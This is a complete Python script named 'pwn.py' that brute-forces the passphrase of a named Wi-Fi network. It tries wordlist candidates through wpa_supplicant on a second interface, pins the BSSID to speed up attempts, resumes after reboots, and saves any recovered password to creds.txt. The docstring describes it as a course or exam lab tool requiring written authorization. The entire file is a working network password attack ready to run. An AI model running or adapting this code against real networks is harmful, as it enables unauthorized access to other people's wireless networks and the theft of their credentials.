#!/usr/bin/env python3
"""pwn.py - dual-STA autopwner. wlan0 (B1-405) NEVER touched. All attacks via wlan1.

Usage (as root): python3 pwn.py --target Vijay --time 100 --out ./results
Reboot-safe: every try is appended to OUT/done.log and live progress goes to
OUT/status.json; a restart skips already-tried passwords and continues with
the remaining time budget (tracked in OUT/run.json).
Scope: only the named target SSID + own lab. Requires written course authorization.
"""
import argparse, json, os, re, subprocess, sys, time, datetime

CTRL = "/run/wpa_supplicant_pwn"
IFACE = "wlan1"

def sh(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        return 124, "TIMEOUT"

def cli(*args, timeout=15):
    return sh(["wpa_cli", "-p", CTRL, "-i", IFACE] + list(args), timeout)

def wlan0_status():
    rc, out = sh(["wpa_cli", "-i", "wlan0", "status"], 10)
    d = {}
    for line in out.splitlines():
        if "=" in line:
            k, v = line.split("=", 1); d[k.strip()] = v.strip()
    return d

def wlan0_healthy():
    d = wlan0_status()
    return d.get("wpa_state") == "COMPLETED" and bool(d.get("ip_address"))

def scan(timeout_s=8):
    cli("scan")
    time.sleep(timeout_s)
    rc, out = cli("scan_results")
    nets = []
    for line in out.splitlines():
        if line.startswith("bssid") or not line.strip():
            continue
        parts = line.split("\t")
        if len(parts) < 5:
            continue
        bssid, freq, sig, flags, ssid = parts[0], parts[1], parts[2], parts[3], parts[4]
        try: sig = int(sig)
        except: pass
        nets.append({"bssid": bssid, "freq": freq, "signal": sig, "flags": flags, "ssid": ssid})
    return nets

def sec_of(flags):
    f = flags or ""
    if "SAE" in f and "PSK" not in f: return "WPA3-SAE"
    if "SAE" in f: return "WPA2/WPA3-mixed"
    if "WPA2" in f and "PSK" in f: return "WPA2-PSK"
    if "WPA" in f: return "WPA-PSK"
    if "WEP" in f: return "WEP"
    if "ESS" in f or f == "" or f == "[ESS]": return "OPEN"
    return f or "UNKNOWN"

def wpa_quote(s):
    return '"' + s.replace("\\", "\\\\").replace('"', '\\"') + '"'

def try_psk(ssid, password, key_mgmt="WPA-PSK", wait_s=10.0, bssid=None, freq=None):
    """Attempt one credential on wlan1 only. Returns (ok, info).
    BSSID-pinning halves fail time (measured 14s -> 7s); fail-fast on
    DISCONNECTED/INACTIVE avoids waiting out the full budget per try."""
    rc, out = cli("add_network")
    nid = out.strip().splitlines()[-1].strip() if out.strip() else None
    if not nid or not nid.isdigit():
        return False, f"add_network failed: {out}"
    cli("set_network", nid, "ssid", wpa_quote(ssid))
    if bssid:
        cli("set_network", nid, "bssid", bssid)
    if freq:
        cli("set_network", nid, "scan_freq", freq)
    if key_mgmt == "NONE":
        cli("set_network", nid, "key_mgmt", "NONE")
    else:
        cli("set_network", nid, "psk", wpa_quote(password))
        cli("set_network", nid, "key_mgmt", key_mgmt)
    cli("enable_network", nid)
    cli("select_network", nid)
    ok = False
    deadline = time.time() + wait_s
    state = ""
    while time.time() < deadline:
        time.sleep(1.0)
        rc2, st = cli("status")
        m = re.search(r"wpa_state=(\S+)", st)
        state = m.group(1) if m else ""
        if state == "COMPLETED":
            ok = True
            break
        if state in ("INACTIVE", "DISCONNECTED"):
            break  # definitive reject - don't burn the remaining budget
    ip = ""
    if ok:
        sh(["dhcpcd", "--timeout", "8", IFACE], timeout=20)
        time.sleep(2)
        rc3, ipout = sh(["ip", "-4", "-o", "addr", "show", IFACE], 10)
        m = re.search(r"inet (\S+)", ipout)
        ip = m.group(1) if m else ""
        if not ip:
            ok = False  # associated but no DHCP = treat as fail for scoring
    # cleanup this network, drop wlan1 lease (never touch wlan0)
    cli("remove_network", nid)
    if not ok:
        sh(["dhcpcd", "-k", IFACE], timeout=10)
    return ok, f"state={state} ip={ip}"

def load_candidates(path):
    cands = []
    if os.path.isfile(path):
        with open(path, errors="ignore") as f:
            for line in f:
                w = line.rstrip("\n").strip()
                if w and not w.startswith("#"):
                    cands.append(w)
    return cands

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="Vijay")
    ap.add_argument("--time", type=int, default=100, help="attack budget minutes")
    ap.add_argument("--out", default="./results")
    ap.add_argument("--words", default="/tmp/pwn-words/combined.txt")
    ap.add_argument("--wait", type=float, default=10.0)
    ap.add_argument("--resume", dest="resume", action="store_true", default=True,
                    help="skip passwords already in OUT/done.log (default on)")
    ap.add_argument("--no-resume", dest="resume", action="store_false",
                    help="ignore OUT/done.log and start the queue from scratch")
    a = ap.parse_args()

    os.makedirs(a.out, exist_ok=True)
    DONE = os.path.join(a.out, "done.log")
    STATUS = os.path.join(a.out, "status.json")
    RUN = os.path.join(a.out, "run.json")
    logf = open(os.path.join(a.out, "pwn.log"), "a", buffering=1)
    def log(msg):
        line = f"{datetime.datetime.now().isoformat(timespec='seconds')} {msg}"
        print(line, flush=True); logf.write(line + "\n")

    if os.geteuid() != 0:
        log("[!] must run as root (sudo)"); sys.exit(1)
    if not wlan0_healthy():
        log(f"[!] wlan0 not healthy at start: {wlan0_status()} (refusing to proceed)")
        sys.exit(2)

    # reboot-safe budget: first start recorded once, all restarts share it
    try:
        with open(RUN) as f:
            run = json.load(f)
    except Exception:
        run = {}
    if "first_start" not in run:
        run = {"budget_min": a.time, "first_start": time.time(),
               "target": a.target, "words": a.words}
        with open(RUN, "w") as f:
            json.dump(run, f)
    budget_left = run["budget_min"] * 60 - (time.time() - run["first_start"])
    if budget_left <= 0:
        log("[*] total time budget already exhausted in a previous run - exiting")
        sys.exit(6)
    log(f"[*] wlan0 healthy: {wlan0_status()} - starting, target={a.target} "
        f"budget_left={budget_left/60:.1f}min")

    # wait for target to appear (test AP added during exam)
    deadline = time.time() + min(25 * 60, budget_left * 0.25)
    target = None
    allnets = []
    while time.time() < deadline:
        nets = scan()
        allnets = nets
        with open(os.path.join(a.out, "scan.json"), "w") as f:
            json.dump({"at": datetime.datetime.now().isoformat(), "nets": nets}, f, indent=2)
        hit = [n for n in nets if n["ssid"] == a.target]
        if hit:
            target = sorted(hit, key=lambda n: n["signal"] if isinstance(n["signal"], int) else -99, reverse=True)[0]
            log(f"[*] target found: {target}")
            break
        log(f"[*] waiting for '{a.target}'... visible={[n['ssid'] for n in nets][:8]}")
        if not wlan0_healthy():
            log("[!] wlan0 disturbed during scan - aborting"); sys.exit(3)
        time.sleep(15)
    if not target:
        log(f"[!] target '{a.target}' never appeared. scan saved. wlan0={wlan0_status()}")
        sys.exit(4)

    sec = sec_of(target["flags"])
    log(f"[*] target security: {sec} flags={target['flags']}")
    result = {"target": a.target, "bssid": target["bssid"], "security": sec,
              "found_at": datetime.datetime.now().isoformat(), "password": None,
              "wlan0_intact": True}

    if sec == "OPEN":
        ok, info = try_psk(a.target, "", key_mgmt="NONE",
                          bssid=target["bssid"], freq=target["freq"])
        log(f"[*] OPEN connect: ok={ok} {info}")
        if ok:
            result["password"] = "<OPEN-NO-PASSWORD>"
    else:
        cands = load_candidates(a.words)
        log(f"[*] loaded {len(cands)} candidates from {a.words}")
        if not cands:
            log("[!] empty wordlist - run candidates.sh first"); sys.exit(5)
        if a.resume:
            try:
                with open(DONE, errors="ignore") as f:
                    done = {ln.rstrip("\n") for ln in f}
            except Exception:
                done = set()
            skipped = len(done)
            cands = [w for w in cands if w not in done]
            log(f"[*] resume: skipping {skipped} already-tried, {len(cands)} remain")
        else:
            done = set()
            try:
                os.remove(DONE)
            except Exception:
                pass
        total = len(cands) + (len(done) if a.resume else 0)
        donef = open(DONE, "a", buffering=1)
        def mark_done(w):
            donef.write(w + "\n")
        def write_status(tried, current, ok_last, found=None):
            try:
                with open(STATUS, "w") as f:
                    json.dump({
                        "target": a.target, "tried": tried, "total": total,
                        "current": current, "ok_last": ok_last,
                        "started_iso": datetime.datetime.fromtimestamp(run["first_start"]).isoformat(timespec="seconds"),
                        "updated_epoch": time.time(),
                        "budget_min": run["budget_min"],
                        "budget_left_min": round((t_end - time.time()) / 60, 1),
                        "found": found,
                    }, f)
            except Exception:
                pass
        km = "WPA-PSK"
        if "SAE" in (target["flags"] or "") and "PSK" not in (target["flags"] or ""):
            km = "SAE"
        t_end = run["first_start"] + run["budget_min"] * 60
        tried = total - len(cands)
        write_status(tried, "-", False)
        for w in cands:
            if time.time() > t_end:
                log("[*] time budget exhausted"); break
            if not wlan0_healthy():
                log("[!] wlan0 disturbed mid-attack - stopping, will re-verify"); result["wlan0_intact"] = False; break
            tried += 1
            ok, info = try_psk(a.target, w, key_mgmt=km, wait_s=a.wait,
                              bssid=target["bssid"], freq=target["freq"])
            mark_done(w)
            write_status(tried, w, ok)
            if tried % 25 == 0 or ok:
                log(f"[{tried}/{total}] try {w!r}: ok={ok} {info} wlan0={wlan0_status().get('wpa_state')}")
            if ok:
                result["password"] = w
                write_status(tried, w, True, found=w)
                log(f"[+] SUCCESS {a.target} : {w}")
                break
        result["tried"] = tried

    result["wlan0_final"] = wlan0_status()
    result["wlan0_intact"] = wlan0_healthy()
    with open(os.path.join(a.out, "result.json"), "w") as f:
        json.dump(result, f, indent=2)
    if result["password"]:
        with open(os.path.join(a.out, "creds.txt"), "w") as f:
            f.write(f"{a.target}:{result['password']}\n")
        log(f"[DONE] PASSWORD: {a.target}:{result['password']} | wlan0 intact={result['wlan0_intact']}")
    else:
        log(f"[DONE] password NOT found. wlan0 intact={result['wlan0_intact']} final={result['wlan0_final']}")

if __name__ == "__main__":
    main()
